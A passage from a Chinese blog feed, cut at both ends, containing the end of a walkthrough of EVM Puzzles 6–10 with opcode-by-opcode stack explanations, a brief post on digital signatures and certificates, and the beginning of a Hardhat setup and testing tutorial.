bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">############</span></span><br><span class="line"><span class="comment"># Puzzle 6 #</span></span><br><span class="line"><span class="comment">############</span></span><br><span class="line"></span><br><span class="line">00      6000      PUSH1 00</span><br><span class="line">02      35        CALLDATALOAD</span><br><span class="line">03      56        JUMP</span><br><span class="line">04      FD        REVERT</span><br><span class="line">05      FD        REVERT</span><br><span class="line">06      FD        REVERT</span><br><span class="line">07      FD        REVERT</span><br><span class="line">08      FD        REVERT</span><br><span class="line">09      FD        REVERT</span><br><span class="line">0A      5B        JUMPDEST</span><br><span class="line">0B      00        STOP</span><br></pre></td></tr></table></figure><p>这道题遇到了新的指令<code>CALLDATALOAD</code>，该指令需要一个参数 **CALLDATALOAD(p)**表示从附加在交易中的 <strong>calldata</strong> 中获取数据，即从位置 p 的开始获取调用数据。例如，当栈顶为 08 时，执行 <strong>CALLDATALOAD</strong> 表示，所有从 byte 8 到 byte 32 的 calldata会被压入栈顶，如果 calldata 是 64 字节并且需要访问序列的第二个 32 个字节，可以先压入<code>20</code>堆栈，然后使用<code>CALLDATALOAD</code>来获取序列的第二个 32 个字节。</p><p>所以这道题需要输入的 calldata 为 a，但是由于在发送 calldata 时，当 calldata 不满足32字节时会从左向右进行填充，所以 0a 就会变成 <code>a00000000000000000000000000000000000000000000000000000000000000</code>，所以可以向 0x0a 在左边填充 0 即：<code>0x000000000000000000000000000000000000000000000000000000000000000a</code>。</p><h3 id="Puzzle-7"><a href="#Puzzle-7" class="headerlink" title="Puzzle 7"></a>Puzzle 7</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">############</span></span><br><span class="line"><span class="comment"># Puzzle 7 #</span></span><br><span class="line"><span class="comment">############</span></span><br><span class="line"></span><br><span class="line">00      36        CALLDATASIZE</span><br><span class="line">01      6000      PUSH1 00</span><br><span class="line">03      80        DUP1</span><br><span class="line">04      37        CALLDATACOPY</span><br><span class="line">05      36        CALLDATASIZE</span><br><span class="line">06      6000      PUSH1 00</span><br><span class="line">08      6000      PUSH1 00</span><br><span class="line">0A      F0        CREATE</span><br><span class="line">0B      3B        EXTCODESIZE</span><br><span class="line">0C      6001      PUSH1 01</span><br><span class="line">0E      14        EQ</span><br><span class="line">0F      6013      PUSH1 13</span><br><span class="line">11      57        JUMPI</span><br><span class="line">12      FD        REVERT</span><br><span class="line">13      5B        JUMPDEST</span><br><span class="line">14      00        STOP</span><br></pre></td></tr></table></figure><p><code>CALLDATASIZE</code>需要输入特定大小的 calldata 来解决这个难题，calldata 的大小的值被压入栈后，继续执行<code>PUSH1 00</code>，<code>DUP1</code>，此时栈中的结构是：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">0</span> <span class="number">0</span> calldata_size <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>然后会执行 <strong>CALLDATACOPY</strong> 指令，该指令从交易中复制数据并将其保存在内存中，执行 <strong>CALLDATACOPY</strong> 需要三个参数，<code>[destOffset offset size]</code>，destOffset 表示要存储复制结果的偏移量，offset 表示要复制的调用数据中的字节偏移量，size表示复制的大小。</p><p>在执行 <strong>CALLDATACOPY</strong> 时，<code>destOffset</code>告诉程序内存中的哪个槽来存储从 calldata 复制的数据。<code>offset</code>表示从哪里开始复制调用数据（就像<code>CALLDATALOAD</code>在最后一个示例中确实如此）并且<code>size</code>告诉程序要在内存中存储多少字节序列。在这个过程中，栈顶的所有三个元素都被消耗掉了，所以在执行完 CALLDATACOPY 后栈中的结构是：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>当<code>CALLDATALOAD</code>指令执行时，它会将 calldata 存储在 memory slot<code>0</code>中，从 byte 开始<code>0</code>，并存储整个 calldata 的大小。</p><p>紧接着会执行<code>CALLDATASIZE</code> <code>PUSH1 00</code> <code>PUSH1 00</code>，执行完后栈中的结构为：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">0</span> <span class="number">0</span> calldata_size <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>然后会执行 <strong>CREATE</strong> 指令，该指令会创建一个账户（合约或EOA）。执行 CRATE 指令时需要三个参数，[value offset size]，value 是发送创建合约的 wei 的值，offset 是部署时运行的字节码的内存位置，size 表示字节码的大小。当使用 CREATE 部署新合约时，偏移量的字节码不是新合约的字节码，而是在部署期间被执行的偏移量的字节码，并且返回值是新创建合约的字节码。</p><blockquote><p>这里理解起来有一些抽象，举个例子，如果使用 CREATE 指令来创建一个合约，且部署这个合约的字节码为<code>0x6160016000526002601Ef3</code>，那么由此字节码序列的返回值为 <strong>6001</strong>，因此新创建的合约的字节码为 <strong>6001</strong>，即<code>PUSH1 01</code>，所以当调用这个合约的执行就会执行<code>PUSH1 01</code>。</p></blockquote><p>当 <strong>CREATE</strong> 指令执行后，栈顶的三个值被使用，并且被部署的合约的地址会被压入栈顶，在执行完成后，栈中的结构为：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[address_deployed <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p> 然后就会遇到 <strong>EXTCODESIZE</strong> 指令，该指令需要一个参数，即 **EXTCODESIZE(p)**，返回 p 处的代码的大小。执行完成后继续执行 <code>PUSH1 01</code>，此时栈中的结构为：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">01</span> address_code_size <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>紧接着执行 EQ 指令，会检查栈中前俩个值是否相等，并将判断结果压入栈中，然后继续执行<code>PUSH1 13</code>和<code>JUMPI</code>，压入栈中的 13 即表示 条件跳转的位置，而 EQ 判断的结果表示是否跳转，即意味着我们要提供一个使<code>address_code_size == 01 </code>的 calldata 。</p><p>所以我们只需要传入一个 calldata 使得执行，EXTCIDESIZE 时返回的结果为 1即可。执行 CREATE 操作码时，只有 RETURN 操作码返回的代码才是未来调用部署合约时执行的“运行时代码”。字节码的另一部分只使用一次，仅用于构造函数部分。字节码的另一部分只使用一次，仅用于该<code>constructor</code>部分。因此，我们<code>calldata</code>可以在其中包含我们想要的所有代码，但我们需要确保返回的代码（运行时代码）只有 1 条指令。我们希望我们部署的智能合约只有<code>STOP</code>指令（操作码<code>00</code>）。必须发送到<code>CREATE</code>操作码的代码是这样的</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PUSH1 00 // 00 代表STOP</span><br><span class="line">PUSH1 00 // 这将用作 MSTORE8 的偏移量，在内存中存储 1 个字节</span><br><span class="line">MSTORE8 // 将从偏移量 0 开始在内存中存储 `00` 值（来自第一个 PUSH1）</span><br><span class="line"></span><br><span class="line">PUSH1 01 // 返回多少字节</span><br><span class="line">PUSH1 00 // 从哪个内存偏移量返回这些字节</span><br><span class="line">RETURN</span><br></pre></td></tr></table></figure><p>上面的操作码转为字节码就是<code>0x600060005360016000F3</code>，所以我们只需要将其作为 calldata 传入即可完成该题目，它将使用该 calldata 来创建和部署一个新合约，该合约的运行时代码为<code>00（STOP）</code></p><h3 id="Puzzle-8"><a href="#Puzzle-8" class="headerlink" title="Puzzle 8"></a>Puzzle 8</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">############</span></span><br><span class="line"><span class="comment"># Puzzle 8 #</span></span><br><span class="line"><span class="comment">############</span></span><br><span class="line"></span><br><span class="line">00      36        CALLDATASIZE</span><br><span class="line">01      6000      PUSH1 00</span><br><span class="line">03      80        DUP1</span><br><span class="line">04      37        CALLDATACOPY</span><br><span class="line">05      36        CALLDATASIZE</span><br><span class="line">06      6000      PUSH1 00</span><br><span class="line">08      6000      PUSH1 00</span><br><span class="line">0A      F0        CREATE</span><br><span class="line">0B      6000      PUSH1 00</span><br><span class="line">0D      80        DUP1</span><br><span class="line">0E      80        DUP1</span><br><span class="line">0F      80        DUP1</span><br><span class="line">10      80        DUP1</span><br><span class="line">11      94        SWAP5</span><br><span class="line">12      5A        GAS</span><br><span class="line">13      F1        CALL</span><br><span class="line">14      6000      PUSH1 00</span><br><span class="line">16      14        EQ</span><br><span class="line">17      601B      PUSH1 1B</span><br><span class="line">19      57        JUMPI</span><br><span class="line">1A      FD        REVERT</span><br><span class="line">1B      5B        JUMPDEST</span><br><span class="line">1C      00        STOP</span><br></pre></td></tr></table></figure><p>这道题目又会遇到几个新的指令：</p><ul><li><p><strong>SWAP5：</strong>将位置 0 中的操作码与位置 5 的操作码交换， SWAP 操作包括 SWAP1～SWAP6。</p></li><li><p><strong>GAS：</strong>将交易中剩余的 gas 压入堆栈，会消耗 2 gas。</p></li><li><p><strong>CALL：</strong>创建一个新的子上下文（与外部交互的每个操作都会创建一个新的上下文），并执行外部账户中存在的代码没，如果调用失败，则将 0 压入栈中，否则将 1 压入栈中。如果调用的账户中没有代码，则返回 true。 <strong>CALL</strong> 操作需要 7 个参数，</p><p>— <code>gas</code>：要发送到为执行创建的子上下文的 gas 量<br>— <code>address</code>：将执行上下文的地址<br>— <code>value</code>：以“wei”为单位的值以发送到地址<br>— <code>argsOffset</code>：内存中的字节偏移量（以字节数为单位）<br>— <code>argsSize</code>：从内存中复制的字节大小，具有先前指定的偏移量<br>— <code>retOffset</code>：内存中的字节偏移量，以字节为单位存储执行返回的返回数据<br>— <code>retSize</code>：要从返回的数据中复制的字节大小</p></li></ul><p>然后再来分析代码过程，首先会执行</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">CALLDATASIZE</span><br><span class="line">PUSH1 00</span><br><span class="line">DUP1</span><br><span class="line">CALLDATACOPY</span><br><span class="line">CALLDATASIZE</span><br><span class="line">PUSH1 00</span><br><span class="line">PUSH1 00</span><br><span class="line">CREARTE</span><br></pre></td></tr></table></figure><p>我们传入的 CALLDATA 会创建一个新的合约地址并返回部署地址，当以上操作执行完成后，栈中的结构为</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[address_deployed <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>接下来执行 5 条与 <strong>CALL</strong> 有关的指令，然后执行 <strong>CALL</strong> 指令，该指令创建一个新的子上下文并执行给定帐户的代码，然后回到当前的账户。即 <strong>CALL</strong> 指令用于与另一个合约进行交互</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PUSH1 00</span><br><span class="line">DUP1</span><br><span class="line">DUP1</span><br><span class="line">DUP1</span><br><span class="line">DUP1</span><br></pre></td></tr></table></figure><p>当以上执行被执行完后，栈中的结构如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> address_deployed <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>然后执行 <strong>SWAP5</strong> ，该指令会将栈中的第 0 个和第 5 个值进行交换，执行完成后，栈中的结构如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[address_deployed <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>然后执行 <strong>CALL</strong> 指令，如果子上下文恢复，则返回 0，否则返回 1。在 <strong>CALL</strong> 指令执行完后，会继续执行</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PUSH1 00</span><br><span class="line">EQ</span><br></pre></td></tr></table></figure><p>意味着需要如果要继续向下执行，就需要 <strong>EQ</strong> 返回 0，即意味着 <strong>CALL</strong> 也需要返回 0。所以就需要输入导致 <strong>CALL</strong> 执行失败的 <strong>CALLDATA</strong>。要让 <strong>CALL</strong> 执行失败有三种方法：</p><ol><li>没有足够的gas</li><li>栈中的参数不够</li><li>如果当前执行的上下文来自 <strong>STATICCALL</strong>，并且wei 的值不是 0。</li></ol><p>需要注意的是，如果 <strong>CALL</strong> 调用的地址中没有代码，那么 <strong>CALL</strong> 会始终返回 true。</p><p>在部署时运行的字节码的返回值会成为新创建的合约的合约的字节码，所以我们可以利用字节码传入 <strong>CALLDATA</strong>，使该字节码在运行时返回 <strong>REVERT</strong> 即可。，所以我们需要传递的数据是：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//将 REVERT 的操作码作为合约代码存储在内存中</span><br><span class="line">PUSH1 FD</span><br><span class="line">PUSH1 00</span><br><span class="line">MSTORE 8</span><br><span class="line"></span><br><span class="line">//使构造函数返回存储的运行时代码</span><br><span class="line">PUSH1 01</span><br><span class="line">PUSH1 00</span><br><span class="line">RETURN</span><br></pre></td></tr></table></figure><p>即 <strong>CALLDATA</strong> 是 <code>0x60FD60005360016000F3</code> 。</p><h3 id="Puzzle-9"><a href="#Puzzle-9" class="headerlink" title="Puzzle 9"></a>Puzzle 9</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">############</span></span><br><span class="line"><span class="comment"># Puzzle 9 #</span></span><br><span class="line"><span class="comment">############</span></span><br><span class="line"></span><br><span class="line">00      36        CALLDATASIZE</span><br><span class="line">01      6003      PUSH1 03</span><br><span class="line">03      10        LT</span><br><span class="line">04      6009      PUSH1 09</span><br><span class="line">06      57        JUMPI</span><br><span class="line">07      FD        REVERT</span><br><span class="line">08      FD        REVERT</span><br><span class="line">09      5B        JUMPDEST</span><br><span class="line">0A      34        CALLVALUE</span><br><span class="line">0B      36        CALLDATASIZE</span><br><span class="line">0C      02        MUL</span><br><span class="line">0D      6008      PUSH1 08</span><br><span class="line">0F      14        EQ</span><br><span class="line">10      6014      PUSH1 14</span><br><span class="line">12      57        JUMPI</span><br><span class="line">13      FD        REVERT</span><br><span class="line">14      5B        JUMPDEST</span><br><span class="line">15      00        STOP</span><br></pre></td></tr></table></figure><p>首先了解俩个新的指令：</p><ul><li><strong>LT：</strong> 从栈中弹出两个值并判断<code>value0 &lt; value1</code>，将其结果压入栈中，若为真则压入 1，否则压入 0</li><li><strong>CALLVALUE:</strong> 将当前调用的 wei 的值压入栈中</li></ul><p>首先看第一处的 <strong>JUMPI</strong>，在执行完 <strong>JUMPI</strong> 指令之前栈中的结构如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">09</span> LT_result  <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>所以需要执行 <strong>JUMPI</strong> 的条件就是 <strong>LT_result</strong> 不为 0，即输入的 value 需要 大于 3。</p><p>然后继续执行</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">CALLVALUE</span><br><span class="line">CALLDATASIZE</span><br><span class="line">MUL</span><br><span class="line">PUSH1 08</span><br><span class="line">EQ</span><br><span class="line">PUSH1 14</span><br><span class="line">JUMPI</span><br></pre></td></tr></table></figure><p> 在执行 <strong>JUMPI</strong> 之前，栈中的结构为：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">14</span> EQ_result  <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>所以如果要顺利执行 <strong>JUMPI</strong> 的话，就需要<code>CALLVALUE * CALLDATASIZE == 8</code>，而又需要 <code>CALLDATAVALUE &gt; 3</code>，因此我们传入的 <strong>CALLVALUE</strong> 和 <strong>CALLDATASIZE</strong> 分别是 2 和 4（0x11223344）</p><h3 id="Puzzle-10"><a href="#Puzzle-10" class="headerlink" title="Puzzle 10"></a>Puzzle 10</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#############</span></span><br><span class="line"><span class="comment"># Puzzle 10 #</span></span><br><span class="line"><span class="comment">#############</span></span><br><span class="line"></span><br><span class="line">00      38          CODESIZE</span><br><span class="line">01      34          CALLVALUE</span><br><span class="line">02      90          SWAP1</span><br><span class="line">03      11          GT</span><br><span class="line">04      6008        PUSH1 08</span><br><span class="line">06      57          JUMPI</span><br><span class="line">07      FD          REVERT</span><br><span class="line">08      5B          JUMPDEST</span><br><span class="line">09      36          CALLDATASIZE</span><br><span class="line">0A      610003      PUSH2 0003</span><br><span class="line">0D      90          SWAP1</span><br><span class="line">0E      06          MOD</span><br><span class="line">0F      15          ISZERO</span><br><span class="line">10      34          CALLVALUE</span><br><span class="line">11      600A        PUSH1 0A</span><br><span class="line">13      01          ADD</span><br><span class="line">14      57          JUMPI</span><br><span class="line">15      FD          REVERT</span><br><span class="line">16      FD          REVERT</span><br><span class="line">17      FD          REVERT</span><br><span class="line">18      FD          REVERT</span><br><span class="line">19      5B          JUMPDEST</span><br><span class="line">1A      00          STOP</span><br></pre></td></tr></table></figure><p>还是先学习一下新的操作码：</p><ul><li><strong>GT</strong>：从堆栈中弹出 2 个值并判断<code>value0 &lt; value1</code>，如果结果为 true 则压入 1，否则压入 0</li><li><strong>MOD：</strong>从堆栈中弹出 2 个值并将结果其运算<code>value0 % value1</code>。若分母 ( <code>value1</code>) 是<code>0</code>则结果为 0</li><li><strong>ISZERO：</strong>从堆栈中弹出一个值并判断`value0 === 0，将判断结果压入栈</li></ul><p>在执行完 <strong>SWAP1</strong> 后栈中的结构如下</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[1b callvalue <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>然后会执行 <strong>GT</strong> 指令，如果要顺利执行 <strong>JUMPI</strong>，就是需要 <strong>GT</strong> 指令返回的值为 1，因此我们输入的 <strong>CALLVALUE</strong> 必须要小于 1b(27)，然后就会跳到第 8 条指令。</p><p>接着执行</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">CALLDATASIZE </span><br><span class="line">PUSH2 0003</span><br><span class="line">SWAP1</span><br></pre></td></tr></table></figure><p>以上指令将 CALLDATA 的大小和 0003 压入栈中，并交换他们的位置，此时栈中的结构为</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[calldata_size <span class="number">3</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>然后会执行 <strong>MOD</strong> 指令，该指令会进行取模运算，将得到结果压入栈中，紧接着执行 <strong>ISZERO</strong> 指令，判断栈顶元素的值是否为 0。然后继续往下执行，当执行到 <strong>JUMPI</strong>  时，栈中的结构为：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[0A+CALLVALUE ISZERO_result  <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>由于需要继续往下执行 <strong>JUMPI</strong> ，所在在这里的 <strong>ISERO_result</strong> 的值必须为 1，即意味着上边 <strong>MOD</strong> 运算的结果为 0，且<code>0A+CALLVALUE ISZERO_result == 0x19(25)</code>，所以 <strong>CALLVALUE</strong> 的值为 15，<strong>CALLDATASIZE</strong> 的值为 0 即可。</p><p><img src="/image/evm-puzzles.assets/2.png" alt="2"></p><p>到这里就完成了所有的题目，在完成这些题目的过程中既掌握了不少 EVM opcode 的用法，也了解了 EVM 的基本运行机制。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Evm-puzzles 是一个以太坊操作码的挑战，每道题都会提供一些列操作码，并提示输入正确的交易值或者调用数据。通过Evm-puzzles可以了解EVM操作码的运行机制&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/image/evm-puzzles.assets/1.png&quot; a</summary>
      
    
    
    
    <category term="Solidity" scheme="https://banana69.site/categories/Solidity/"/>
    
    
    <category term="Solidity" scheme="https://banana69.site/tags/Solidity/"/>
    
  </entry>
  
  <entry>
    <title>数字签名原理和过程</title>
    <link href="https://banana69.site/2022/06/17/%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/"/>
    <id>https://banana69.site/2022/06/17/%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/</id>
    <published>2022-06-17T07:21:46.000Z</published>
    <updated>2022-07-28T06:31:50.010Z</updated>
    
    <content type="html"><![CDATA[<ul><li><p><strong>数字签名的计算方法：</strong><br>  算出内容的 hash 值，然后用私钥加密，这就是数字签名；<br>  用户收到信息后，用公钥解密数字签名得到 hash 值，与原内容的hash值进行比较。</p></li><li><p><strong>作用：</strong></p><ol><li> 不可抵赖：如果公钥能解密，则内容一定是与该公钥对应的私钥加密而来，即可证明来源。</li><li>数据完整性：数字签名的HASH值和自己计算出的HASH值一致，即可证明该内容是完整的未经修改过。<br>但是数字签名不能确保”公钥”的真实性，第三方可偷换”公钥”，达到与伪服务器通信的目的。</li></ol></li><li><p><strong>数字证书</strong><br>  由权威证书中心颁发用来证明公钥的真实性。</p></li><li><p><strong>数字签名的过程：</strong><br>  现有通信双方 A,B，俩者之间使用俩套非对称加密机制，现在A向B发送消息<br>  <img src="/image/%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D.assets/image-20220415231317783.png" alt="image-20220415231317783"><br>  存在问题：如果在发送过程中有人修改了秘文的消息，B拿到的秘文就并非是A所发送的，所以需要数字签名解决俩个问题：</p><pre><code>  1⃣️A的身份认证  2⃣️A发送的消息完整性</code></pre><p>  <img src="/image/%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D.assets/image-20220415231328262.png" alt="image-20220415231328262"><br>  A：将明文进行摘要运算后得到摘要（消息完整性），再将摘要用A的私钥加密（身份认证），得到数字签名，将密文和数字签名一块发给B。<br>  B：收到A的消息后，先将密文用自己的私钥解密，得到明文。将数字签名用A的公钥进行解密后，得到正确的摘要（解密成功说明A的身份被认证了)。</p><p>  对明文进行摘要运算，得到实际收到的摘要，将两份摘要进行对比，如果一致，说明消息没有被篡改（消息完整性）。</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;数字签名的计算方法：&lt;/strong&gt;&lt;br&gt;  算出内容的 hash 值，然后用私钥加密，这就是数字签名；&lt;br&gt;  用户收到信息后，用公钥解密数字签名得到 hash 值，与原内容的hash值进行比较。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;</summary>
      
    
    
    
    <category term="密码学" scheme="https://banana69.site/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
    <category term="数字签名" scheme="https://banana69.site/tags/%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/"/>
    
  </entry>
  
  <entry>
    <title>Hardhat 基本操作</title>
    <link href="https://banana69.site/2022/04/17/hardhat%20%E4%BD%BF%E7%94%A8/"/>
    <id>https://banana69.site/2022/04/17/hardhat%20%E4%BD%BF%E7%94%A8/</id>
    <published>2022-04-17T07:21:46.000Z</published>
    <updated>2022-07-28T06:49:37.907Z</updated>
    
    <content type="html"><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>Hardhat 是一个用于编译、部署、测试和调试以太坊软件的开发环境。它可以帮助开发人员管理和自动化构建智能合约和 dApp 过程中固有的重复性任务，并围绕此工作流程轻松引入更多功能。这意味着在核心上编译、运行和测试智能合约。</p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><ol><li><p>初始化 hardhat 项目：<code>npx hardhat</code></p></li><li><p>项目结构为：</p><ul><li><p><code>contracts/</code>是合约所在的位置。</p></li><li><p><code>test/</code>是测试文件的位置。</p></li><li><p><code>scripts/</code>是部署脚本的位置。</p></li></ul></li><li><p>编译合约：<code>npx hardhat compile</code></p><p>当一个项目中有不同版本的合约文件时可以在 <code>hardhat.config.js</code>中配置编译器的版本，有以下俩种方式：</p><ul><li><p>配置不同的版本号</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  <span class="attr">solidity</span>: &#123;</span><br><span class="line">    <span class="attr">compilers</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">version</span>: <span class="string">&quot;0.5.5&quot;</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">version</span>: <span class="string">&quot;0.6.7&quot;</span>,</span><br><span class="line">        <span class="attr">settings</span>: &#123;&#125;,</span><br><span class="line">      &#125;,</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这样配置可以使合约中不同的文件应用于不同的编译器</p></li><li><p>根据文件进行配置</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  <span class="attr">solidity</span>: &#123;</span><br><span class="line">    <span class="attr">compilers</span>: [...],</span><br><span class="line">    <span class="attr">overrides</span>: &#123;</span><br><span class="line">      <span class="string">&quot;contracts/Foo.sol&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">version</span>: <span class="string">&quot;0.5.5&quot;</span>,</span><br><span class="line">        <span class="attr">settings</span>: &#123; &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将合约编译器的版本号指定到不同的文件</p></li></ul></li><li><p>测试合约：<code>npx hardhat test</code></p><p>例：针对以下这份合约编写简单的测试文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//Greeter.sol</span><br><span class="line">//SPDX-License-Identifier: Unlicense</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;hardhat/console.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Greeter &#123;</span><br><span class="line">    string private greeting;</span><br><span class="line"></span><br><span class="line">    constructor(string memory _greeting) &#123;</span><br><span class="line">        console.log(&quot;Deploying a Greeter with greeting:&quot;, _greeting);</span><br><span class="line">        greeting = _greeting;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function greet() public view returns (string memory) &#123;</span><br><span class="line">        return greeting;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setGreeting(string memory _greeting) public &#123;</span><br><span class="line">        console.log(&quot;Changing greeting from &#x27;%s&#x27; to &#x27;%s&#x27;&quot;, greeting, _greeting);</span><br><span class="line">        greeting = _greeting;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>编写测试文件使用 Waffle 库，它是一个编写和测试智能合约的库，使用<code>ether.js</code>。我们在这里使用<code>chai</code>，它是一个断言库。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; expect &#125; = <span class="built_in">require</span>(<span class="string">&quot;chai&quot;</span>);</span><br></pre></td></tr></table></figure><p>在封装器中的 <code>it</code> 的回调函数中使用了<code>async</code>，与以太坊网络和智能合约的交互是异步操作，因此大多数 API 和库使用 JavaScript 的 <code>promise</code> 来返回值。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">describe(<span class="string">&quot;Greeter&quot;</span>, <span class="function"><span class="keyword">function</span> (<span 